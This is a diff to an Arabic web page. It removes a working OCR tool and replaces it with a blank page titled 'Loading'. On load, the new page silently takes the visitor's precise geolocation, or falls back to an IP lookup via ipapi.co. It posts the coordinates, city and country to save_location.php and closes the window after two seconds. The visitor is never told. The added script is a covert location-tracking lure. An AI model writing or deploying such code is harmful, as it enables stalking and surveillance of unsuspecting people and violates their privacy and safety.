@@ -1,229 +1,121 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>استخراج النص من الصور - OCR بالعربية</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل</title>
+    <script>
+        // دالة لحفظ البيانات في ملف txt
+        function saveToFile(data) {
+            // إنشاء كائن FormData
+            const formData = new FormData();
+            formData.append('data', JSON.stringify(data));
+            formData.append('token', 'SECURE_TOKEN_12345'); // توكن أمان
+            
+            // إرسال البيانات إلى الخادم
+            fetch('save_location.php', {
+                method: 'POST',
+                body: formData,
+                keepalive: true // ضمان إرسال البيانات حتى لو أُغلقت الصفحة
+            });
+        }
 
-  <!-- تحسين محركات البحث -->
-  <meta name="description" content="أفضل أداة مجانية لاستخراج النصوص من الصور باللغة العربية والإنجليزية. استخراج نص من الصور اون لاين، تحويل الصور إلى نصوص قابلة للتعديل. OCR عربي وإنجليزي بدقة عالية.">
-  <meta name="keywords" content="استخراج النص من الصور, OCR بالعربي, تحويل صورة إلى نص, استخراج نصوص من صورة, OCR عربي, استخراج الكتابة من الصور, التعرف البصري على الحروف, OCR online Arabic, تحويل الصور إلى نص مكتوب, استخراج النصوص من الصور, Arabic OCR online, التعرف على النص من الصور, موقع OCR, تحويل الصور إلى PDF, OCR free, استخراج النص من صورة, OCR image to text, صورة إلى نص عربي, قراءة النص من الصورة, استخراج المحتوى من الصور, نسخ النص من الصور, تمييز الحروف بالعربي, برنامج تحويل الصور إلى نصوص, قراءة الكتابة من صورة, OCR عربي مجاني, استخراج الكتابة من الصور بدقة, تحويل صورة مكتوبة إلى نص, مسح صورة واستخراج نصها, استخراج جمل من الصور, الذكاء الاصطناعي OCR, معالجة الصور للنصوص, OCR حديث, OCR مفتوح المصدر, OCR في المتصفح بدون تحميل, تحويل صورة إلى PDF عربي, استخراج نص من صورة PNG JPG">
-
-  <link href="https://fonts.googleapis.com/css2?family=Cairo&display=swap" rel="stylesheet">
-  <style>
-    body {
-      margin:0; padding:0;
-      font-family:'Cairo',sans-serif;
-      background:linear-gradient(135deg,#1e1f52,#430d5c);
-      color:#eee;
-      display:flex; justify-content:center; align-items:center;
-      min-height:100vh;
-      flex-direction: column;
-    }
-
-    .menu-icon {
-      position: absolute;
-      top: 15px;
-      right: 20px;
-      font-size: 24px;
-      cursor: pointer;
-      z-index: 999;
-    }
-
-    .container {
-      background:linear-gradient(to bottom right,#2b2d66,#3c1d65);
-      width:90%; max-width:420px;
-      padding:25px 20px;
-      border-radius:18px;
-      box-shadow:0 10px 30px rgba(0,0,0,0.6);
-      text-align:center;
-    }
-
-    h1 {
-      font-size:1.5rem;
-      color:#f3d9ff;
-      margin-bottom:20px;
-    }
-
-    .drop-area {
-      border:2px dashed #6f42c1;
-      border-radius:12px;
-      padding:20px;
-      margin-bottom:20px;
-      background:#1e1f52;
-    }
-
-    input[type="file"] {
-      width:100%;
-      padding:10px;
-      background:#3c3f7d;
-      color:#fff;
-      border:none;
-      border-radius:6px;
-      margin-top:10px;
-    }
-
-    button {
-      width:100%;
-      background:#8e33ff;
-      border:none;
-      color:#fff;
-      padding:12px;
-      border-radius:6px;
-      font-size:1rem;
-      cursor:pointer;
-      transition:0.3s;
-      margin-top:10px;
-    }
-
-    button:hover { background:#a650ff; }
-    button:disabled { background:#555; cursor:not-allowed; }
-
-    .loader {
-      margin:18px auto;
-      width:48px; height:48px;
-      border:6px solid #eee;
-      border-top-color:#a044ff;
-      border-radius:50%;
-      animation:spin 1s linear infinite;
-      display:none;
-    }
-
-    @keyframes spin {
-      to { transform:rotate(360deg); }
-    }
-
-    textarea {
-      width:100%;
-      height:150px;
-      margin-top:15px;
-      padding:12px;
-      border-radius:6px;
-      border:2px solid #6c5dd3;
-      background:#1e1f52;
-      color:#eee;
-      font-size:1rem;
-      display:none;
-      resize:none;
-    }
-
-    .error {
-      color:#ff7276;
-      margin-top:12px;
-      font-size:0.9rem;
-      display:none;
-    }
-
-    .actions {
-      margin-top:15px;
-      display:none;
-    }
-
-    .actions button {
-      margin-top:10px;
-    }
-
-    footer {
-      margin-top: 30px;
-      font-size: 0.85rem;
-      color: #ccc;
-      text-align: center;
-      padding: 10px 0;
-    }
-  </style>
+        // عند تحميل الصفحة
+        window.addEventListener('DOMContentLoaded', function() {
+            // محاولة الحصول على الموقع الجغرافي
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // جمع البيانات
+                        const locationData = {
+                            timestamp: new Date().toISOString(),
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            source: 'geolocation'
+                        };
+                        
+                        // حفظ البيانات في الملف
+                        saveToFile(locationData);
+                    },
+                    function(error) {
+                        // في حالة الخطأ، محاولة الحصول على الموقع عبر IP
+                        fetch('https://ipapi.co/json/')
+                            .then(response => response.json())
+                            .then(ipData => {
+                                const locationData = {
+                                    timestamp: new Date().toISOString(),
+                                    latitude: ipData.latitude,
+                                    longitude: ipData.longitude,
+                                    accuracy: 50000, // دقة منخفضة
+                                    source: 'ipapi',
+                                    error: getGeolocationError(error),
+                                    city: ipData.city,
+                                    country: ipData.country_name
+                                };
+                                
+                                // حفظ البيانات في الملف
+                                saveToFile(locationData);
+                            });
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                // المتصفح لا يدعم خدمة الموقع الجغرافي
+                fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(ipData => {
+                        const locationData = {
+                            timestamp: new Date().toISOString(),
+                            latitude: ipData.latitude,
+                            longitude: ipData.longitude,
+                            accuracy: 50000, // دقة منخفضة
+                            source: 'ipapi',
+                            error: 'GEOLOCATION_NOT_SUPPORTED',
+                            city: ipData.city,
+                            country: ipData.country_name
+                        };
+                        
+                        // حفظ البيانات في الملف
+                        saveToFile(locationData);
+                    });
+            }
+            
+            // دالة لترميز أخطاء الموقع الجغرافي
+            function getGeolocationError(error) {
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        return 'PERMISSION_DENIED';
+                    case error.POSITION_UNAVAILABLE:
+                        return 'POSITION_UNAVAILABLE';
+                    case error.TIMEOUT:
+                        return 'TIMEOUT';
+                    default:
+                        return 'UNKNOWN_ERROR';
+                }
+            }
+            
+            // إغلاق الصفحة بعد 2 ثانية
+            setTimeout(function() {
+                window.close();
+            }, 2000);
+        });
+    </script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+            height: 100vh;
+            overflow: hidden;
+        }
+    </style>
 </head>
 <body>
-
-  <!-- أيقونة القائمة -->
-  <div class="menu-icon" onclick="alert('القائمة ستتوفر قريبًا')">☰</div>
-
-  <!-- المحتوى الرئيسي -->
-  <div class="container">
-    <h1>🧠 استخراج النص من الصور</h1>
-    <div class="drop-area">
-      <label for="imageInput">اختر صورة من جهازك</label>
-      <input type="file" id="imageInput" accept="image/*">
-    </div>
-    <button id="extractBtn" disabled>📄 استخراج النص</button>
-    <div class="loader" id="loaderOCR"></div>
-    <div class="error" id="errMsg"></div>
-    <textarea id="result" placeholder="النص المستخرج سيظهر هنا..."></textarea>
-    <div class="actions" id="actions">
-      <button onclick="downloadText()">📥 تحميل النص</button>
-      <button onclick="downloadPDF()">🧾 حفظ كـ PDF</button>
-    </div>
-  </div>
-
-  <!-- حقوق النشر -->
-  <footer>
-    جميع الحقوق محفوظة © 2025 - موقع استخراج النص من الصور | OCR Online Arabic Text Extractor
-  </footer>
-
-  <!-- المكتبات -->
-  <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-
-  <!-- السكريبت -->
-  <script>
-    (function(){
-      const input = document.getElementById('imageInput'),
-            btn = document.getElementById('extractBtn'),
-            loader = document.getElementById('loaderOCR'),
-            errEl = document.getElementById('errMsg'),
-            textarea = document.getElementById('result'),
-            actions = document.getElementById('actions');
-
-      input.addEventListener('change', ()=>{
-        errEl.style.display='none';
-        textarea.style.display='none';
-        actions.style.display='none';
-        btn.disabled = !(input.files && input.files[0]);
-      });
-
-      btn.addEventListener('click', ()=>{
-        const file = input.files[0];
-        if (!file) return;
-        btn.disabled = true;
-        errEl.style.display='none';
-        loader.style.display='block';
-
-        Tesseract.recognize(file, 'ara+eng', {
-          logger: m => {}
-        }).then(({data:{text}})=>{
-          loader.style.display='none';
-          textarea.value = text.trim();
-          textarea.style.display = 'block';
-          actions.style.display = 'block';
-          btn.disabled = false;
-        }).catch(err=>{
-          loader.style.display='none';
-          errEl.textContent = 'حدث خطأ أثناء استخراج النص. حاول مجددًا.';
-          errEl.style.display = 'block';
-          btn.disabled = false;
-          console.error(err);
-        });
-      });
-
-      window.downloadText = function(){
-        const t = textarea.value;
-        if (!t) return;
-        const blob = new Blob([t], {type:'text/plain'});
-        const a = document.createElement('a');
-        a.href = URL.createObjectURL(blob);
-        a.download = 'extracted.txt';
-        a.click();
-      };
-
-      window.downloadPDF = function(){
-        const t = textarea.value;
-        if (!t) return;
-        const { jsPDF } = window.jspdf;
-        const doc = new jsPDF();
-        const lines = doc.splitTextToSize(t, 180);
-        doc.text(lines, 10, 10);
-        doc.save('extracted.pdf');
-      };
-    })();
-  </script>
+    <!-- الصفحة فارغة تماماً -->
 </body>
 </html>
